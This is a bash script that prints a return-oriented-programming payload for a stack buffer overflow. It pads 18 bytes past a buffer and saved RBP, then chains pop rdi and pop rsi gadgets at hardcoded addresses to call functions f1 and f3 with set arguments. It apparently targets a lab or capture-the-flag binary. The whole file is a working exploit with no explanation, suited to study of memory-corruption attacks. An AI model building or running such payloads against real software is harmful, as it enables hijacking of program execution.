#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause

# Padding: 10 bytes buffer + 8 bytes saved RBP = 18 bytes
padding_length="18"

# Gadgets and function addresses (little-endian 64-bit)
pop_rdi="\xcf\x20\x40\x00\x00\x00\x00\x00"      # 0x4020cf : pop rdi ; ret
pop_rsi="\x3e\xa1\x40\x00\x00\x00\x00\x00"      # 0x40a13e : pop rsi ; ret
f1_addr="\x8b\x19\x40\x00\x00\x00\x00\x00"      # 0x40198b : f1
f3_addr="\x35\x19\x40\x00\x00\x00\x00\x00"      # 0x401935 : f3

# Values for parameters
val_56="\x38\x00\x00\x00\x00\x00\x00\x00"       # 56 (0x38)
val_13="\x0d\x00\x00\x00\x00\x00\x00\x00"       # 13 (0x0d)

# Build ROP chain payload
# 1. Set RDI = 56
# 2. Set RSI = 13
# 3. Call f1
# 4. Set RDI = 13
# 5. Call f3

payload=""
payload+=$(yes "A" | head -n "$padding_length" | paste -sd "")
payload+="$pop_rdi"
payload+="$val_56"
payload+="$pop_rsi"
payload+="$val_13"
payload+="$f1_addr"
payload+="$pop_rdi"
payload+="$val_13"
payload+="$f3_addr"

# print payload to stdout

echo -ne "$payload"
